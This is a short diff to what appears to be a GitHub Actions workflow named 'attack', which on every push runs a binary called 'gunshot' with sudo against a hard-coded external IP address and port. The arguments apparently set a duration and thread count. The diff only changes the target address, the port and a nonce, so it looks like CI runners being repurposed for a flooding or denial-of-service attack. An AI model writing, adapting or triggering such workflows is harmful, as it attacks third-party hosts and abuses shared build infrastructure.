@@ -1,4 +1,4 @@
-name: attack-de0a265d
+name: attack-945ddeaf
 on:
   push:
     branches: [ main, master ]
@@ -18,7 +18,7 @@ jobs:
     - name: Make executable
       run: chmod +x gunshot
     - name: Fire
-      run: sudo ./gunshot 91.108.9.69 32000 60 200
+      run: sudo ./gunshot 91.108.9.84 32002 60 200
       continue-on-error: true
-    - name: Nonce de0a265d
-      run: echo "nonce=de0a265d"
+    - name: Nonce 945ddeaf
+      run: echo "nonce=945ddeaf"
